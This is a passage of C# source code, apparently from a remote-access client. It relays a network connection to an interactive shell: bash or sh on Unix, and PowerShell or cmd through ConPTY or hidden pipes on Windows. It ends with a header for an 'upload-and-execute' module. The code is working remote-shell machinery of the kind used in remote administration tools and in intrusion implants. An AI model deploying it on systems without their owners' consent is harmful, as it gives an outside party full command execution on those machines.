            var cols = (header[2] << 8) | header[3];
            if (rows <= 0 || cols <= 0) { rows = 24; cols = 80; }
            if (cancel.IsCancellationRequested) return;

            Log.Info($"[+] Interactive shell session started ({rows}x{cols}).");
            if (Platform.IsWindows)
                ShellWindows(sock, rows, cols);
            else
                ShellUnix(sock, rows, cols);
            Log.Info("[+] Interactive shell session ended.");
        }
        catch (Exception ex)
        {
            if (!cancel.IsCancellationRequested)
                Log.Error("[!] shell session error: " + ex.Message);
        }
        finally
        {
            if (sock != null)
            {
                try { sock.Close(); } catch { }
            }
            lock (Gate)
            {
                if (ReferenceEquals(_conn, sock)) _conn = null;
                if (ReferenceEquals(_thread, Thread.CurrentThread)) _thread = null;
                _busy = false;
            }
        }
    }

    // ---------------------------------------------------------------------
    // Unix
    // ---------------------------------------------------------------------

    private static string ShellExecutable()
    {
        var android = Platform.ShellExecutable();
        if (!string.IsNullOrEmpty(android)) return android;
        var env = Environment.GetEnvironmentVariable("SHELL") ?? "";
        if (!string.IsNullOrEmpty(env) && File.Exists(env)) return env;
        if (File.Exists("/bin/bash")) return "/bin/bash";
        return "/bin/sh";
    }

    private static string SingleQuote(string value)
        => "'" + value.Replace("'", "'\\''") + "'";

    private static void ShellUnix(Conn conn, int rows, int cols)
    {
        var shell = ShellExecutable();
        if (!File.Exists(shell))
            shell = File.Exists("/bin/bash") ? "/bin/bash" : "/bin/sh";
        var command = $"stty rows {rows} cols {cols} 2>/dev/null; exec {SingleQuote(shell)} -i";
        var script = Platform.Which("script");
        if (!string.IsNullOrEmpty(script))
        {
            ShellUnixWithScript(conn, script, command);
            return;
        }
        // No script(1): start a shell on ordinary pipes. This keeps commands
        // and interactive programs usable, but cannot provide job control.
        ShellUnixPipes(conn, shell);
    }

    private static void ShellUnixWithScript(Conn conn, string script, string command)
    {
        var psi = new ProcessStartInfo
        {
            FileName = script,
            RedirectStandardInput = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };
        if (Platform.IsDarwin)
        {
            // macOS script(1) has a different command-line shape.
            foreach (var arg in new[] { "-q", "/dev/null", "/bin/sh", "-c", command })
                psi.ArgumentList.Add(arg);
        }
        else
        {
            foreach (var arg in new[] { "-q", "-e", "-f", "-c", command, "/dev/null" })
                psi.ArgumentList.Add(arg);
        }
        psi.Environment["TERM"] = "dumb";
        psi.Environment.Remove("COLORTERM");
        psi.Environment["PYTHONUNBUFFERED"] = "1";
        if (!psi.Environment.ContainsKey("PYTHONIOENCODING"))
            psi.Environment["PYTHONIOENCODING"] = "utf-8";

        using var proc = new Process { StartInfo = psi, EnableRaisingEvents = true };
        if (!proc.Start()) throw new IOException("cannot start " + script);
        try
        {
            var stdout = proc.StandardOutput.BaseStream;
            var stderr = proc.StandardError.BaseStream;
            var reader = new Thread(() =>
            {
                var buffer = new byte[65536];
                try
                {
                    while (true)
                    {
                        var n = stdout.Read(buffer, 0, buffer.Length);
                        if (n <= 0) break;
                        if (!SendOutput(conn, buffer, n)) break;
                    }
                }
                catch { }
            }) { IsBackground = true, Name = "pty-reader" };
            reader.Start();
            var errorDrain = new Thread(() =>
            {
                try
                {
                    var buffer = new byte[4096];
                    while (stderr.Read(buffer, 0, buffer.Length) > 0) { }
                }
                catch { }
            }) { IsBackground = true, Name = "pty-stderr" };
            errorDrain.Start();

            var input = new BoundedInputWriter(data =>
            {
                try
                {
                    proc.StandardInput.BaseStream.Write(data, 0, data.Length);
                    proc.StandardInput.BaseStream.Flush();
                    return true;
                }
                catch { return false; }
            });
            var buffer = new byte[65536];
            var exitedAt = DateTime.MinValue;
            var droppedNotice = false;
            while (true)
            {
                if (proc.HasExited)
                {
                    if (exitedAt == DateTime.MinValue) exitedAt = DateTime.UtcNow;
                    if ((DateTime.UtcNow - exitedAt).TotalSeconds > 0.25) break;
                }
                var n = conn.Read(buffer, 0, buffer.Length, 200);
                if (n < 0)
                {
                    if (input.Failed) break;
                    continue;
                }
                if (n == 0) break;
                var copy = new byte[n];
                Buffer.BlockCopy(buffer, 0, copy, 0, n);
                if (!input.Send(copy) && !droppedNotice)
                {
                    droppedNotice = true;
                    SendOutputText(conn,
                        "\r\n[client] shell input dropped: the shell is not reading\r\n");
                }
            }
            input.Close();
            try
            {
                proc.StandardInput.Close();
            }
            catch { }
            try
            {
                if (!proc.WaitForExit(500)) proc.Kill(true);
            }
            catch { }
            reader.Join(1000);
            try { proc.Kill(true); } catch { }
            try { proc.WaitForExit(500); } catch { }
        }
        finally
        {
            try
            {
                if (!proc.HasExited) proc.Kill(true);
            }
            catch { }
            try { proc.WaitForExit(500); } catch { }
        }
    }

    private static void ShellUnixPipes(Conn conn, string shell)
    {
        var psi = new ProcessStartInfo
        {
            FileName = shell,
            RedirectStandardInput = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };
        psi.ArgumentList.Add("-i");
        psi.Environment["TERM"] = "dumb";
        psi.Environment.Remove("COLORTERM");
        psi.Environment["PYTHONUNBUFFERED"] = "1";
        using var proc = new Process { StartInfo = psi };
        if (!proc.Start()) throw new IOException("cannot start " + shell);
        try
        {
            var reader = new Thread(() =>
            {
                var buffer = new byte[65536];
                try
                {
                    while (true)
                    {
                        var n = proc.StandardOutput.BaseStream.Read(buffer, 0, buffer.Length);
                        if (n <= 0) break;
                        if (!SendOutput(conn, buffer, n)) break;
                    }
                }
                catch { }
            }) { IsBackground = true, Name = "pipe-shell-output" };
            reader.Start();
            var errorDrain = new Thread(() =>
            {
                try
                {
                    var buffer = new byte[4096];
                    while (proc.StandardError.BaseStream.Read(buffer, 0, buffer.Length) > 0) { }
                }
                catch { }
            }) { IsBackground = true, Name = "pipe-shell-stderr" };
            errorDrain.Start();
            var input = new BoundedInputWriter(data =>
            {
                try
                {
                    proc.StandardInput.BaseStream.Write(data, 0, data.Length);
                    proc.StandardInput.BaseStream.Flush();
                    return true;
                }
                catch { return false; }
            });
            var buffer = new byte[65536];
            while (true)
            {
                if (proc.HasExited && !reader.IsAlive) break;
                var n = conn.Read(buffer, 0, buffer.Length, 200);
                if (n < 0) { if (input.Failed) break; continue; }
                if (n == 0) break;
                var copy = new byte[n];
                Buffer.BlockCopy(buffer, 0, copy, 0, n);
                input.Send(copy);
            }
            input.Close();
            try { proc.StandardInput.Close(); } catch { }
            try { proc.Kill(true); } catch { }
            try { proc.WaitForExit(500); } catch { }
            reader.Join(500);
        }
        finally
        {
            try { if (!proc.HasExited) proc.Kill(true); } catch { }
        }
    }

    private static bool SendOutput(Conn conn, byte[] data, int count)
    {
        var copy = new byte[count];
        Buffer.BlockCopy(data, 0, copy, 0, count);
        try
        {
            Protocol.SendShellOutput(conn, copy);
            return true;
        }
        catch { return false; }
    }

    private static void SendOutputText(Conn conn, string text)
        => Protocol.SendShellOutput(conn, Encoding.UTF8.GetBytes(text));

    // ---------------------------------------------------------------------
    // Windows ConPTY
    // ---------------------------------------------------------------------

    private static void ShellWindows(Conn sock, int rows, int cols)
    {
        if (Platform.IsWindows)
        {
            try
            {
                ShellWindowsConPty(sock, rows, cols);
                return;
            }
            catch (Exception ex)
            {
                var reason = string.IsNullOrEmpty(ex.Message) ? ex.GetType().Name : ex.Message;
                Log.Error($"[!] ConPTY shell failed ({reason}); using the pipe fallback.");
                SendOutputText(sock, $"\r\n[client] ConPTY unavailable: {reason}\r\n");
            }
        }
        ShellWindowsPipes(sock);
    }

    private static void ShellWindowsConPty(Conn sock, int rows, int cols)
    {
        var k32 = Win32Kernel.Instance;
        var shell = Platform.Which("powershell.exe");
        if (string.IsNullOrEmpty(shell)) shell = "powershell.exe";
        if (string.IsNullOrEmpty(Platform.Which("powershell.exe"))) shell = "cmd.exe";
        var args = shell.EndsWith("powershell.exe", StringComparison.OrdinalIgnoreCase)
            ? " -NoLogo" : "";
        var app = Platform.Which(shell) is { Length: > 0 } found ? found : shell;

        IntPtr inRead = IntPtr.Zero, inWrite = IntPtr.Zero;
        IntPtr outRead = IntPtr.Zero, outWrite = IntPtr.Zero;
        IntPtr hpc = IntPtr.Zero;
        IntPtr attrBuf = IntPtr.Zero;
        IntPtr envBlock = IntPtr.Zero;
        var si = new STARTUPINFOEX();
        var pi = new PROCESS_INFORMATION();
        var stage = "starting";
        try
        {
            stage = "CreatePipe(input)";
            if (!Win32Kernel.CreatePipe(out inRead, out inWrite, IntPtr.Zero, 0))
                throw new IOException("CreatePipe(input): " + Win32Kernel.LastError());
            stage = "CreatePipe(output)";
            if (!Win32Kernel.CreatePipe(out outRead, out outWrite, IntPtr.Zero, 0))
                throw new IOException("CreatePipe(output): " + Win32Kernel.LastError());
            stage = "CreatePseudoConsole";
            var size = new COORD { X = (short)Math.Max(1, cols), Y = (short)Math.Max(1, rows) };
            var hr = Win32Kernel.CreatePseudoConsole(size, inRead, outWrite, 0, out hpc);
            if (hr != 0) throw new IOException("CreatePseudoConsole: HRESULT 0x" + hr.ToString("x8"));

            stage = "InitializeProcThreadAttributeList";
            var needed = IntPtr.Zero;
            Win32Kernel.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref needed);
            if (needed == IntPtr.Zero)
                throw new IOException("InitializeProcThreadAttributeList(size): " + Win32Kernel.LastError());
            attrBuf = Marshal.AllocHGlobal(needed);
            if (!Win32Kernel.InitializeProcThreadAttributeList(attrBuf, 1, 0, ref needed))
                throw new IOException("InitializeProcThreadAttributeList: " + Win32Kernel.LastError());
            stage = "UpdateProcThreadAttribute";
            if (!Win32Kernel.UpdateProcThreadAttribute(attrBuf, 0, (IntPtr)0x00020016, hpc,
                    (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero))
                throw new IOException("UpdateProcThreadAttribute: " + Win32Kernel.LastError());

            si.StartupInfo.cb = (uint)Marshal.SizeOf<STARTUPINFOEX>();
            si.StartupInfo.dwFlags = 0;
            si.StartupInfo.wShowWindow = 0;
            si.lpAttributeList = attrBuf;

            var environment = new SortedDictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            foreach (System.Collections.DictionaryEntry item in Environment.GetEnvironmentVariables())
            {
                var key = item.Key?.ToString() ?? "";
                if (key.Length == 0 || key.Contains('=')) continue;
                environment[key] = item.Value?.ToString() ?? "";
            }
            environment["PYTHONUNBUFFERED"] = "1";
            if (!environment.ContainsKey("PYTHONIOENCODING"))
                environment["PYTHONIOENCODING"] = "utf-8";
            var block = string.Join('\0', environment.Select(pair => $"{pair.Key}={pair.Value}")) + "\0\0";
            envBlock = Marshal.StringToHGlobalUni(block);

            var cmdline = new StringBuilder($"\"{app}\"{args}");
            stage = "CreateProcessW";
            var flags = 0x00080000u | 0x00000400u; // EXTENDED_STARTUPINFO_PRESENT | CREATE_UNICODE_ENVIRONMENT
            if (!Win32Kernel.CreateProcessW(app, cmdline, IntPtr.Zero, IntPtr.Zero, false,
                    flags, envBlock, null, ref si, out pi))
                throw new IOException("CreateProcessW: " + Win32Kernel.LastError());
            Win32Kernel.CloseHandle(inRead);
            Win32Kernel.CloseHandle(outWrite);
            inRead = outWrite = IntPtr.Zero;
        }
        catch (Exception ex)
        {
            Win32Kernel.CloseHandle(inWrite);
            Win32Kernel.CloseHandle(outRead);
            Win32Kernel.CloseHandle(inRead);
            Win32Kernel.CloseHandle(outWrite);
            if (hpc != IntPtr.Zero) Win32Kernel.ClosePseudoConsole(hpc);
            Win32Kernel.CloseHandle(pi.hThread);
            Win32Kernel.CloseHandle(pi.hProcess);
            if (attrBuf != IntPtr.Zero) Win32Kernel.DeleteProcThreadAttributeList(attrBuf);
            if (envBlock != IntPtr.Zero) Marshal.FreeHGlobal(envBlock);
            throw new IOException(stage + ": " + ex.Message, ex);
        }

        var stop = new ManualResetEventSlim(false);
        var reader = new Thread(() =>
        {
            var buffer = new byte[65536];
            try
            {
                while (true)
                {
                    if (!Win32Kernel.ReadFile(outRead, buffer, (uint)buffer.Length, out var read, IntPtr.Zero)
                        || read == 0) break;
                    var copy = new byte[read];
                    Buffer.BlockCopy(buffer, 0, copy, 0, (int)read);
                    if (!SendOutput(sock, copy, copy.Length)) break;
                }
            }
            catch { }
            finally { stop.Set(); }
        }) { IsBackground = true, Name = "conpty-reader" };
        reader.Start();

        WindowsCtrlCHelper? helper = null;
        WindowsInputWriter? writer = null;
        try
        {
            helper = new WindowsCtrlCHelper(pi.dwProcessId);
            var write = new Func<byte[], bool?>(data =>
            {
                var offset = 0;
                while (offset < data.Length)
                {
                    var piece = offset == 0 ? data : data[offset..];
                    if (!Win32Kernel.WriteFile(inWrite, piece, (uint)piece.Length, out var written, IntPtr.Zero))
                    {
                        if (Win32Kernel.GetLastError() == 995) return null;
                        return false;
                    }
                    if (written == 0) return false;
                    offset += (int)written;
                }
                return true;
            });
            var ctrlC = new Func<bool>(() =>
            {
                if (helper.Send()) return true;
                return write(Encoding.ASCII.GetBytes("\x03")) != false;
            });
            writer = new WindowsInputWriter(write, ctrlC);
            var buffer = new byte[65536];
            while (!stop.IsSet && !writer.Failed)
            {
                if (Win32Kernel.WaitForSingleObject(pi.hProcess, 0) == 0)
                {
                    Thread.Sleep(80);
                    stop.Set();
                    break;
                }
                var n = sock.Read(buffer, 0, buffer.Length, 200);
                if (n < 0) continue;
                if (n == 0) break;
                var copy = new byte[n];
                Buffer.BlockCopy(buffer, 0, copy, 0, n);
                writer.Send(copy);
            }
        }
        catch { }
        finally
        {
            stop.Set();
            try { writer?.Close(); } catch { }
            try { helper?.Close(); } catch { }
            try { Win32Kernel.TerminateProcess(pi.hProcess, 1); } catch { }
            try { Win32Kernel.WaitForSingleObject(pi.hProcess, 1000); } catch { }
            try { if (hpc != IntPtr.Zero) Win32Kernel.ClosePseudoConsole(hpc); } catch { }
            try { reader.Join(1000); } catch { }
            Win32Kernel.CloseHandle(inWrite);
            Win32Kernel.CloseHandle(outRead);
            Win32Kernel.CloseHandle(pi.hThread);
            Win32Kernel.CloseHandle(pi.hProcess);
            if (attrBuf != IntPtr.Zero) Win32Kernel.DeleteProcThreadAttributeList(attrBuf);
            if (envBlock != IntPtr.Zero) Marshal.FreeHGlobal(envBlock);
        }
    }

    private static void ShellWindowsPipes(Conn sock)
    {
        var shell = Platform.Which("powershell.exe");
        if (string.IsNullOrEmpty(shell)) shell = "cmd.exe";
        var psi = new ProcessStartInfo
        {
            FileName = shell,
            RedirectStandardInput = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = false,
            WindowStyle = ProcessWindowStyle.Hidden
        };
        psi.Environment["PYTHONUNBUFFERED"] = "1";
        using var proc = new Process { StartInfo = psi };
        if (!proc.Start()) throw new IOException("cannot start " + shell);
        var stop = new ManualResetEventSlim(false);
        var sendLock = new object();
        bool SendRaw(byte[] data)
        {
            lock (sendLock)
            {
                try { Protocol.SendShellOutput(sock, data); return true; }
                catch { stop.Set(); return false; }
            }
        }

        var pump = new Thread(() =>
        {
            var buffer = new byte[65536];
            try
            {
                while (true)
                {
                    var n = proc.StandardOutput.BaseStream.Read(buffer, 0, buffer.Length);
                    if (n <= 0) break;
                    var copy = new byte[n];
                    Buffer.BlockCopy(buffer, 0, copy, 0, n);
                    if (!SendRaw(copy)) break;
                }
            }
            catch { }
            finally
            {
                stop.Set();
                try { sock.ShutdownWrite(); } catch { }
            }
        }) { IsBackground = true, Name = "pipe-shell-output" };
        pump.Start();
        var errPump = new Thread(() =>
        {
            var buffer = new byte[65536];
            try
            {
                while (true)
                {
                    var n = proc.StandardError.BaseStream.Read(buffer, 0, buffer.Length);
                    if (n <= 0) break;
                    var copy = new byte[n];
                    Buffer.BlockCopy(buffer, 0, copy, 0, n);
                    if (!SendRaw(copy)) break;
                }
            }
            catch { }
        }) { IsBackground = true, Name = "pipe-shell-stderr" };
        errPump.Start();

        var helper = Platform.IsWindows ? new WindowsCtrlCHelper((uint)proc.Id) : null;
        var lines = new BlockingCollection<string>(64);
        var writerThread = new Thread(() =>
        {
            foreach (var line in lines.GetConsumingEnumerable())
            {
                if (stop.IsSet) break;
                try
                {
                    var bytes = Encoding.UTF8.GetBytes(line + "\r\n");
                    proc.StandardInput.BaseStream.Write(bytes, 0, bytes.Length);
                    proc.StandardInput.BaseStream.Flush();
                }
                catch { stop.Set(); break; }
            }
        }) { IsBackground = true, Name = "pipe-shell-input" };
        writerThread.Start();

        var decoder = Encoding.UTF8.GetDecoder();
        var pendingEscape = "";
        var lineBuf = new StringBuilder();
        var lastWasCr = false;
        var dropped = 0;
        try
        {
            var data = new byte[65536];
            var chars = new char[65536];
            while (!stop.IsSet)
            {
                var n = sock.Read(data, 0, data.Length, 200);
                if (n < 0) continue;
                if (n == 0) break;
                var count = decoder.GetChars(data, 0, n, chars, 0, false);
                var text = new string(chars, 0, count);
                var filtered = FilterShellKeys(pendingEscape + text);
                pendingEscape = filtered.Pending;
                foreach (var ch in filtered.Text)
                {
                    if (ch == '\n' && lastWasCr) { lastWasCr = false; continue; }
                    lastWasCr = ch == '\r';
                    if (ch is '\r' or '\n')
                    {
                        var command = lineBuf.ToString();
                        lineBuf.Clear();
                        SendRaw(Encoding.UTF8.GetBytes("\r\n"));
                        if (!lines.TryAdd(command))
                        {
                            dropped++;
                            SendRaw(Encoding.UTF8.GetBytes("\r\n[client] input queue full; line dropped\r\n"));
                        }
                        continue;
                    }
                    if (ch is '\x7f' or '\b')
                    {
                        if (lineBuf.Length > 0) { lineBuf.Length--; SendRaw(Encoding.UTF8.GetBytes("\b \b")); }
                        continue;
                    }
                    if (ch == '\x03')
                    {
                        lineBuf.Clear();
                        SendRaw(Encoding.UTF8.GetBytes("^C\r\n"));
                        if (helper == null || !helper.Send())
                        {
                            try
                            {
                                proc.StandardInput.BaseStream.WriteByte(3);
                                proc.StandardInput.BaseStream.Flush();
                            }
                            catch { stop.Set(); }
                        }
                        continue;
                    }
                    if (ch == '\t')
                    {
                        lineBuf.Append("    ");
                        SendRaw(Encoding.UTF8.GetBytes("    "));
                        continue;
                    }
                    if (ch < ' ') continue;
                    lineBuf.Append(ch);
                    SendRaw(Encoding.UTF8.GetBytes(ch.ToString()));
                }
            }
        }
        catch { }
        finally
        {
            stop.Set();
            try { helper?.Close(); } catch { }
            try { proc.Kill(true); } catch { }
            try { proc.StandardInput.Close(); } catch { }
            lines.CompleteAdding();
            try { writerThread.Join(500); } catch { }
            try { proc.WaitForExit(500); } catch { }
        }
    }

    private static (string Text, string Pending) FilterShellKeys(string text)
    {
        var output = new StringBuilder();
        var index = 0;
        while (index < text.Length)
        {
            var ch = text[index];
            if (ch != '\x1b') { output.Append(ch); index++; continue; }
            var next = index + 1;
            if (next >= text.Length) return (output.ToString(), text[index..]);
            if (text[next] is '[' or 'O')
            {
                next++;
                while (next < text.Length && !(text[next] >= '@' && text[next] <= '~')) next++;
                if (next >= text.Length) return (output.ToString(), text[index..]);
                index = next + 1;
                continue;
            }
            index += 2;
        }
        return (output.ToString(), "");
    }

    // ---------------------------------------------------------------------
    // Windows helpers
    // ---------------------------------------------------------------------

    private sealed class WindowsInputWriter
    {
        private readonly Func<byte[], bool?> _writeChunk;
        private readonly Func<bool> _ctrlC;
        private readonly int _maxPending = 4 * 1024 * 1024;
        private readonly object _gate = new();
        private readonly byte[] _data = new byte[4 * 1024 * 1024];
        private int _dataLength;
        private int _ctrl;
        private bool _stop;
        private int _threadId;
        public int Dropped;
        public volatile bool Failed;
        private readonly Thread _thread;

        public WindowsInputWriter(Func<byte[], bool?> writeChunk, Func<bool> ctrlC)
        {
            _writeChunk = writeChunk;
            _ctrlC = ctrlC;
            _thread = new Thread(Run) { IsBackground = true, Name = "windows-shell-input" };
            _thread.Start();
        }

        public void Send(byte[] data)
        {
            if (data.Length == 0 || Failed) return;
            var pieces = SplitCtrlC(data);
            var gotCtrl = false;
            lock (_gate)
            {
                foreach (var (piece, isLast) in pieces)
                {
                    if (piece.Length > 0)
                    {
                        var room = Math.Max(0, _maxPending - _dataLength);
                        var take = Math.Min(piece.Length, room);
                        if (take > 0)
                        {
                            Buffer.BlockCopy(piece, 0, _data, _dataLength, take);
                            _dataLength += take;
                        }
                        if (take < piece.Length) Dropped += piece.Length - take;
                    }
                    if (!isLast) _ctrl = Math.Min(_ctrl + 1, 64);
                }
                gotCtrl = _ctrl > 0;
                Monitor.PulseAll(_gate);
            }
            if (gotCtrl) CancelBlockedWrite();
        }

        private static List<(byte[] Piece, bool IsLast)> SplitCtrlC(byte[] data)
        {
            var pieces = new List<(byte[], bool)>();
            var start = 0;
            for (var i = 0; i < data.Length; i++)
            {
                if (data[i] != 3) continue;
                if (i > start)
                {
                    var piece = new byte[i - start];
                    Buffer.BlockCopy(data, start, piece, 0, piece.Length);
                    pieces.Add((piece, false));
                }
                else pieces.Add((Array.Empty<byte>(), false));
                start = i + 1;
            }
            if (start < data.Length)
            {
                var tail = new byte[data.Length - start];
                Buffer.BlockCopy(data, start, tail, 0, tail.Length);
                pieces.Add((tail, true));
            }
            else if (pieces.Count == 0) pieces.Add((Array.Empty<byte>(), true));
            else
            {
                var last = pieces[^1];
                pieces[^1] = (last.Item1, true);
            }
            return pieces;
        }

        private void CancelBlockedWrite()
        {
            if (!Platform.IsWindows) return;
            try
            {
                var handle = Win32Kernel.OpenThread(0x0001, false, (uint)_threadId);
                if (handle == IntPtr.Zero) return;
                try { Win32Kernel.CancelSynchronousIo(handle); }
                finally { Win32Kernel.CloseHandle(handle); }
            }
            catch { }
        }

        private void Run()
        {
            _threadId = Win32Kernel.GetCurrentThreadId();
            while (true)
            {
                byte[]? chunk = null;
                var doCtrl = false;
                lock (_gate)
                {
                    while (!_stop && _ctrl == 0 && _dataLength == 0)
                        Monitor.Wait(_gate, 200);
                    if (_stop && _ctrl == 0 && _dataLength == 0) return;
                    if (_ctrl > 0) { _ctrl--; doCtrl = true; }
                    else
                    {
                        var take = Math.Min(65536, _dataLength);
                        chunk = new byte[take];
                        Buffer.BlockCopy(_data, 0, chunk, 0, take);
                        Buffer.BlockCopy(_data, take, _data, 0, _dataLength - take);
                        _dataLength -= take;
                    }
                }
                bool ok;
                try { ok = doCtrl ? _ctrlC() : (_writeChunk(chunk!) != false); }
                catch { ok = false; }
                if (!ok) { Failed = true; return; }
            }
        }

        public void Close(double wait = 0.5)
        {
            lock (_gate)
            {
                _stop = true;
                Monitor.PulseAll(_gate);
            }
            try { _thread.Join(TimeSpan.FromSeconds(wait)); } catch { }
        }
    }

    private sealed class WindowsCtrlCHelper
    {
        private Process? _proc;
        private readonly ManualResetEventSlim _ready = new(false);
        private readonly ManualResetEventSlim _dead = new(false);
        private readonly object _gate = new();
        private string? _response;
        private Thread? _reader;

        public WindowsCtrlCHelper(uint pid)
        {
            try
            {
                var psi = SelfExec.HelperStartInfo("--ctrlc-helper", pid.ToString());
                psi.RedirectStandardInput = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = false;
                _proc = Process.Start(psi);
                if (_proc == null) throw new IOException("cannot start ctrl-c helper");
                try { _proc.StandardError.BaseStream.CopyTo(Stream.Null); } catch { }
                _reader = new Thread(Reader) { IsBackground = true, Name = "windows-ctrlc-helper" };
                _reader.Start();
            }
            catch
            {
                _dead.Set();
                _ready.Set();
            }
        }

        private void Reader()
        {
            var first = true;
            try
            {
                var stdout = _proc!.StandardOutput;
                while (true)
                {
                    var line = stdout.ReadLine();
                    if (line == null) break;
                    line = line.Trim();
                    if (first)
                    {
                        first = false;
                        if (line == "R") { _ready.Set(); continue; }
                        break;
                    }
                    if (line is "D" or "E")
                    {
                        lock (_gate)
                        {
                            _response = line;
                            Monitor.PulseAll(_gate);
                        }
                    }
                }
            }
            catch { }
            finally
            {
                lock (_gate)
                {
                    _dead.Set();
                    _ready.Set();
                    Monitor.PulseAll(_gate);
                }
            }
        }

        public bool Send()
        {
            if (_dead.IsSet || !_ready.IsSet || _proc == null) return false;
            lock (_gate) _response = null;
            try
            {
                _proc.StandardInput.WriteLine("C");
                _proc.StandardInput.Flush();
            }
            catch { _dead.Set(); return false; }
            var deadline = DateTime.UtcNow.AddSeconds(1);
            lock (_gate)
            {
                while (_response == null && !_dead.IsSet)
                {
                    var remaining = deadline - DateTime.UtcNow;
                    if (remaining <= TimeSpan.Zero) break;
                    Monitor.Wait(_gate, remaining);
                }
                return _response == "D";
            }
        }

        public void Close()
        {
            _dead.Set();
            lock (_gate) Monitor.PulseAll(_gate);
            var proc = _proc;
            _proc = null;
            if (proc == null) return;
            try { proc.StandardInput.Close(); } catch { }
            try { proc.Kill(true); } catch { }
            try { proc.WaitForExit(500); } catch { }
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct COORD { public short X; public short Y; }

    [StructLayout(LayoutKind.Sequential)]
    private struct STARTUPINFO
    {
        public uint cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    private sealed class Win32Kernel
    {
        private static readonly Lazy<Win32Kernel> LazyInstance = new(() => new Win32Kernel());
        public static Win32Kernel Instance => LazyInstance.Value;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int GetCurrentThreadId();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint GetLastError();

        public static string LastError() => new System.ComponentModel.Win32Exception((int)GetLastError()).Message;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CreatePipe(out IntPtr read, out IntPtr write, IntPtr attributes, uint size);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int CreatePseudoConsole(COORD size, IntPtr input, IntPtr output,
            uint flags, out IntPtr hpc);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int ResizePseudoConsole(IntPtr hpc, COORD size);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern void ClosePseudoConsole(IntPtr hpc);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool InitializeProcThreadAttributeList(IntPtr list, int count,
            int flags, ref IntPtr size);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool UpdateProcThreadAttribute(IntPtr list, uint flags,
            IntPtr attribute, IntPtr value, IntPtr size, IntPtr previous, IntPtr returned);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern void DeleteProcThreadAttributeList(IntPtr list);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessW(string? application, StringBuilder commandLine,
            IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles,
            uint creationFlags, IntPtr environment, string? currentDirectory,
            ref STARTUPINFOEX startupInfo, out PROCESS_INFORMATION processInfo);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadFile(IntPtr file, [Out] byte[] buffer, uint count,
            out uint read, IntPtr overlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteFile(IntPtr file, [Out] byte[] buffer, uint count,
            out uint written, IntPtr overlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool TerminateProcess(IntPtr process, uint exitCode);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr handle, uint milliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr handle);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenThread(uint access, bool inherit, uint threadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CancelSynchronousIo(IntPtr thread);
    }
}

public sealed class BoundedInputWriter
{
    private readonly Func<byte[], bool> _write;
    private readonly object _gate = new();
    private readonly Queue<byte[]> _queue = new();
    private int _pending;
    private readonly int _maxPending = 4 * 1024 * 1024;
    private bool _stop;
    public volatile bool Failed;
    public long Dropped;
    private readonly Thread _thread;

    public BoundedInputWriter(Func<byte[], bool> write)
    {
        _write = write;
        _thread = new Thread(Run) { IsBackground = true, Name = "shell-input" };
        _thread.Start();
    }

    public bool Send(byte[] data)
    {
        if (Failed || data.Length == 0) return false;
        lock (_gate)
        {
            if (_stop) return false;
            var room = Math.Max(0, _maxPending - _pending);
            var take = Math.Min(data.Length, room);
            if (take > 0)
            {
                var copy = new byte[take];
                Buffer.BlockCopy(data, 0, copy, 0, take);
                _queue.Enqueue(copy);
                _pending += take;
            }
            if (take < data.Length) Dropped += data.Length - take;
            Monitor.PulseAll(_gate);
            return take == data.Length;
        }
    }

    private void Run()
    {
        while (true)
        {
            byte[]? data;
            lock (_gate)
            {
                while (!_stop && _queue.Count == 0) Monitor.Wait(_gate, 200);
                if (_queue.Count == 0) { if (_stop) return; continue; }
                data = _queue.Dequeue();
                _pending -= data.Length;
                Monitor.PulseAll(_gate);
            }
            try
            {
                if (!_write(data)) { Failed = true; return; }
            }
            catch { Failed = true; return; }
        }
    }

    public void Close(double wait = 0.5)
    {
        lock (_gate) { _stop = true; Monitor.PulseAll(_gate); }
        try { _thread.Join(TimeSpan.FromSeconds(wait)); } catch { }
    }
}

// ===== Upex.cs =====
// Upex.cs - client-side upload-and-execute support.
//
